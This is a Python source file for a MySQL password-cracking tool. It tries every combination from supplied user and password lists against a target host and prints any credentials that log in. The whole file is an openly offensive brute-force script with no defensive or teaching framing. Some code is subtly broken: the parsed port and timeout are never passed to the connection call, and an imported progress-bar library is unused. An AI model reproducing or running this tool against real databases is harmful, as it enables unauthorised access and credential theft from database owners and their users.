import os
import sys
import mysql.connector
from tqdm import tqdm

class MYSQL:
    def __init__(self):
        self.user = []
        self.pasw = []
        self.host = None
        self.log = False
        self.port = 3306
        self.timeout = 200

    def user_input(self, prompt):
        try:
            return input(prompt)
        except NameError:
            return raw_input(prompt)

    def crack(self):
        self.user_input("[?] Press enter to start crack ")
        connection = None
        if self.host:
            count = 0
            found = False
            error = False
            for user in self.user:
                if error == True:
                    break
                if found == True:
                    break
                for pasw in self.pasw:
                    if self.log:
                        print ("[!] Trying '%s'@'%s' using password '%s'" % (user, self.host, pasw))
                    try:
                        connection = mysql.connector.connect(host=self.host, user=user, password=pasw)
                        if connection.is_connected():
                            found = True
                            self.umysql = user
                            self.pmysql = pasw
                            break
                    except mysql.connector.Error as E:
                        if "1698" in str(E):
                            print ("[-] Access denied for %s:%s" % (user, pasw))
                            sys.exit()
                        elif "2003" in str(E):
                            print ("[-] Can not connect to hostname '%s'" % (self.host))
                            sys.exit()
                        elif "1045" in str(E):
                            pass
            if found != True:
                print ("[!] Password not found")
            else:
                print ("---- Session found ----")
                print ("User: " + self.umysql)
                print ("Pass: " + self.pmysql)
        else:
            print ("[-] Hostname or Target not found, please insert target!")

    def setUser(self, word):
        if len(word) > 0:
            self.user = word
            if self.log:
                print ("[*] The User has been read")
        else:
            print ("[!] The user list cannot be read")
            sys.exit()

    def setPass(self, word):
        if len(word) > 0:
            self.pasw = word
            if self.log:
                print ("[*] The Pass has been read")
        else:
            print ("[!] The password list cannot be read")
            sys.exit()

    def setHostPort(self, host):
        if ":" in host:
            split = host.split(":")
            self.host = split[0]
            self.port = int(split[1])
        else:
            self.host = host
            print ("[*] Default port 3306")

    def setTimeout(self, timeout):
        if timeout:
            self.timeout = int(timeout)
        else:
            print ("[*] Default timeout 200")

    def setLog(self, type):
        self.log = type
